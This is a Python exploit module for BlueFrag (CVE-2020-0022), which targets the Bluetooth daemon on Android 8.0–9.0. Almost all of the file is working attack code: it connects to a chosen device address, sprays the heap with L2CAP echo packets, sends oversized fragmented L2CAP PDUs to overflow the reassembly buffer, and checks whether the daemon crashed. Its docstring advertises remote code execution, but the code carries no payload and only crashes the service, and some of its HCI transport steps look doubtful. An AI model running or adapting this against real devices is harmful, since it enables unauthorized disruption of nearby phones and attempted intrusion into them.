#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""BlueFrag: Android Bluetooth RCE via L2CAP reassembly (CVE-2020-0022).

Exploits a heap overflow in Android's Bluetooth daemon (com.android.bluetooth)
caused by improper L2CAP packet reassembly. When a fragmented L2CAP PDU with
an incorrect total length is received, the reassembly buffer overflows into
adjacent heap objects, enabling code execution.

Affected: Android 8.0 to 9.0 (patched February 2020 security bulletin).
Requires proximity and a valid Bluetooth address of the target device.

References:
  https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/
  https://github.com/niclas3210/BlueFrag
  https://source.android.com/docs/security/bulletin/2020-02-01

MITRE ATT&CK: T1210 (Exploitation of Remote Services)
CWE: CWE-787 (Out-of-bounds Write), CWE-122 (Heap-based Buffer Overflow)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import struct
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

L2CAP_CID_SIGNALING = 0x0001
L2CAP_CID_CONNECTIONLESS = 0x0002
ACL_FIRST_NOFLUSH = 0x00
ACL_CONTINUATION = 0x01

HEAP_SPRAY_SIZE = 0x100
OVERFLOW_TRIGGER_LEN = 0xFFFE


@dataclass
class L2CAPPacket:
    """Raw L2CAP packet structure."""
    length: int = 0
    cid: int = 0
    payload: bytes = b""

    def to_bytes(self) -> bytes:
        header = struct.pack("<HH", self.length, self.cid)
        return header + self.payload


@dataclass
class ACLFragment:
    """ACL data fragment for HCI transport."""
    handle: int = 0
    pb_flag: int = ACL_FIRST_NOFLUSH
    bc_flag: int = 0
    data: bytes = b""

    def to_bytes(self) -> bytes:
        flags_handle = (self.handle & 0x0FFF) | ((self.pb_flag & 0x03) << 12) | ((self.bc_flag & 0x03) << 14)
        header = struct.pack("<HH", flags_handle, len(self.data))
        return header + self.data


@dataclass
class TargetInfo:
    """Target device information."""
    bd_addr: str = ""
    name: str = ""
    android_version: str = ""
    acl_handle: int = 0
    mtu: int = 672
    connected: bool = False


def _build_overflow_l2cap(target_mtu: int) -> list[bytes]:
    """Build L2CAP fragments that trigger the reassembly overflow.

    The attack sends an initial L2CAP fragment claiming a total length
    much larger than the allocated reassembly buffer, then sends
    continuation fragments that overflow into adjacent heap objects.
    """
    fragments: list[bytes] = []

    initial_pdu = L2CAPPacket(
        length=OVERFLOW_TRIGGER_LEN,
        cid=L2CAP_CID_CONNECTIONLESS,
        payload=b"\x41" * (target_mtu - 4),
    )
    fragments.append(initial_pdu.to_bytes())

    overflow_data = b"\x42" * HEAP_SPRAY_SIZE
    for _ in range(8):
        fragments.append(overflow_data)

    return fragments


def _build_heap_spray_packets(count: int, spray_size: int) -> list[bytes]:
    """Build L2CAP packets used for heap grooming.

    Sends benign L2CAP echo requests to create predictable heap layout
    before triggering the overflow.
    """
    packets: list[bytes] = []
    for i in range(count):
        identifier = i & 0xFF
        echo_data = struct.pack("<B", identifier) + b"\x43" * (spray_size - 1)
        echo_req = struct.pack("<BBH", 0x08, identifier, len(echo_data)) + echo_data
        pkt = L2CAPPacket(
            length=len(echo_req),
            cid=L2CAP_CID_SIGNALING,
            payload=echo_req,
        )
        packets.append(pkt.to_bytes())
    return packets


class BlueFrag(Exploit):
    """BlueFrag: Android Bluetooth RCE via L2CAP reassembly overflow."""

    __info__: dict[str, Any] = {
        "name": "BlueFrag (CVE-2020-0022)",
        "description": (
            "Android Bluetooth zero-click RCE via L2CAP reassembly heap overflow. "
            "Sends malformed fragmented L2CAP PDUs to overflow the reassembly buffer "
            "in com.android.bluetooth, targeting Android 8.0-9.0."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/",
            "https://github.com/niclas3210/BlueFrag",
            "https://source.android.com/docs/security/bulletin/2020-02-01",
        ),
        "devices": ("Android 8.0", "Android 8.1", "Android 9.0"),
        "severity": "critical",
        "cvss": "8.8",
        "cve": "CVE-2020-0022",
        "mitre": ["T1210"],
    }

    target = OptString("", "Target Bluetooth address (AA:BB:CC:DD:EE:FF)")
    interface = OptString("hci0", "Local Bluetooth HCI interface")
    spray_count = OptInteger(64, "Number of heap spray packets")
    spray_size = OptInteger(256, "Size of each spray allocation")
    overflow_rounds = OptInteger(3, "Number of overflow attempts")
    verify_only = OptBool(False, "Only verify vulnerability without exploitation")
    dry_run = OptBool(False, "Print packet structure without sending")

    def __init__(self) -> None:
        super().__init__()
        self._target_info: TargetInfo | None = None

    def check(self) -> str:
        """Verify Bluetooth interface and target reachability."""
        iface = str(self.interface.value)
        target_addr = str(self.target.value).strip()

        if not target_addr:
            return "Target Bluetooth address required"

        if not shutil.which("hcitool"):
            return "hcitool not found. Install: apt install bluez"

        try:
            result = subprocess.run(
                ["hciconfig", iface],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if "UP RUNNING" not in result.stdout:
                return f"Interface {iface} is not UP. Run: hciconfig {iface} up"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return f"Cannot query interface {iface}"

        try:
            result = subprocess.run(
                ["hcitool", "-i", iface, "name", target_addr],
                capture_output=True,
                text=True,
                timeout=15,
            )
            name = result.stdout.strip()
            if name:
                return f"Target reachable: {name} ({target_addr})"
            return f"Target {target_addr} not responding to name request (may still be exploitable)"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Could not perform name resolution"

    def _connect_acl(self, target_addr: str) -> TargetInfo | None:
        """Establish ACL connection to target."""
        iface = str(self.interface.value)
        print_status(f"[*] Connecting to {target_addr} via {iface}...")

        if self.dry_run.value:
            print_info("[dry-run] Would establish ACL connection")
            return TargetInfo(bd_addr=target_addr, acl_handle=0x0040, connected=True)

        try:
            result = subprocess.run(
                ["hcitool", "-i", iface, "cc", target_addr],
                capture_output=True,
                text=True,
                timeout=15,
            )
            if result.returncode != 0:
                print_error(f"[-] ACL connection failed: {result.stderr.strip()}")
                return None

            con_result = subprocess.run(
                ["hcitool", "-i", iface, "con"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            for line in con_result.stdout.splitlines():
                if target_addr.upper() in line.upper():
                    parts = line.split()
                    for j, part in enumerate(parts):
                        if part.lower() == "handle":
                            try:
                                handle = int(parts[j + 1])
                                info = TargetInfo(
                                    bd_addr=target_addr,
                                    acl_handle=handle,
                                    connected=True,
                                )
                                print_success(f"[+] ACL connected, handle=0x{handle:04x}")
                                return info
                            except (IndexError, ValueError):
                                continue

            print_warning("[!] Connected but could not parse handle")
            return TargetInfo(bd_addr=target_addr, acl_handle=0x0040, connected=True)
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Connection error: {exc}")
            return None

    def _send_raw_hci(self, handle: int, data: bytes, pb_flag: int = ACL_FIRST_NOFLUSH) -> bool:
        """Send raw ACL data via /dev/hciX or hcitool raw."""
        frag = ACLFragment(handle=handle, pb_flag=pb_flag, data=data)
        raw = frag.to_bytes()

        if self.dry_run.value:
            print_info(f"    [dry-run] ACL [{pb_flag}] handle=0x{handle:04x} len={len(data)} data={data[:16].hex()}...")
            return True

        hci_dev = f"/dev/{self.interface.value}"
        if os.path.exists(hci_dev):
            try:
                with open(hci_dev, "wb") as fd:
                    hci_type = struct.pack("<B", 0x02)
                    fd.write(hci_type + raw)
                    fd.flush()
                return True
            except PermissionError:
                print_error(f"[-] Permission denied on {hci_dev}. Run as root.")
                return False
            except OSError as exc:
                logger.debug("HCI write error: %s", exc)

        cmd_hex = raw.hex()
        try:
            subprocess.run(
                ["hcitool", "-i", str(self.interface.value), "cmd", "0x02", cmd_hex],
                capture_output=True,
                timeout=5,
            )
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _heap_groom(self, handle: int) -> None:
        """Groom the heap with predictable allocations."""
        spray_count = int(self.spray_count.value)
        spray_size = int(self.spray_size.value)

        print_status(f"[*] Heap grooming: {spray_count} x {spray_size} byte allocations...")
        packets = _build_heap_spray_packets(spray_count, spray_size)

        for i, pkt in enumerate(packets):
            self._send_raw_hci(handle, pkt, ACL_FIRST_NOFLUSH)
            if i % 16 == 0:
                time.sleep(0.01)

        print_info(f"[*] Sent {len(packets)} spray packets")

    def _trigger_overflow(self, handle: int, target_mtu: int) -> None:
        """Send the malformed L2CAP fragments that trigger the overflow."""
        print_status("[*] Sending overflow trigger fragments...")

        fragments = _build_overflow_l2cap(target_mtu)

        self._send_raw_hci(handle, fragments[0], ACL_FIRST_NOFLUSH)
        time.sleep(0.005)

        for i, frag in enumerate(fragments[1:], 1):
            self._send_raw_hci(handle, frag, ACL_CONTINUATION)
            if i % 4 == 0:
                time.sleep(0.002)

        print_info(f"[*] Sent {len(fragments)} fragments (initial + {len(fragments)-1} continuation)")

    def _check_target_alive(self, target_addr: str) -> bool:
        """Check if target's Bluetooth daemon is still responding."""
        try:
            result = subprocess.run(
                ["hcitool", "-i", str(self.interface.value), "name", target_addr],
                capture_output=True,
                text=True,
                timeout=10,
            )
            return bool(result.stdout.strip())
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def run(self) -> None:
        """Execute BlueFrag attack against Android target."""
        print_status("[*] BlueFrag (CVE-2020-0022) v1.0.0")
        print_warning("[!] Target: Android 8.0-9.0 only. February 2020 patch fixes this.")

        target_addr = str(self.target.value).strip()
        if not target_addr:
            print_error("[-] Set target= to the Bluetooth address of the Android device")
            return

        info = self._connect_acl(target_addr)
        if not info:
            print_error("[-] Could not establish ACL connection")
            return

        self._target_info = info
        rounds = int(self.overflow_rounds.value)

        if self.verify_only.value:
            print_status("[*] Verify mode: sending minimal overflow to detect crash")
            self._trigger_overflow(info.acl_handle, info.mtu)
            time.sleep(2.0)

            alive = self._check_target_alive(target_addr)
            if not alive:
                print_success("[+] Target Bluetooth daemon crashed: VULNERABLE to CVE-2020-0022")
            else:
                print_info("[*] Target still responding: may be patched or wrong Android version")
            return

        for attempt in range(1, rounds + 1):
            print_status(f"\n[*] Attempt {attempt}/{rounds}")

            self._heap_groom(info.acl_handle)
            time.sleep(0.1)

            self._trigger_overflow(info.acl_handle, info.mtu)
            time.sleep(1.0)

            alive = self._check_target_alive(target_addr)
            if not alive:
                print_success(f"[+] Target daemon crashed on attempt {attempt}")
                print_info("[*] Bluetooth service will restart automatically on Android")
                break
            else:
                print_info(f"[*] Target survived attempt {attempt}")

                info_retry = self._connect_acl(target_addr)
                if info_retry:
                    info = info_retry

        print_status("\n[*] BlueFrag complete")
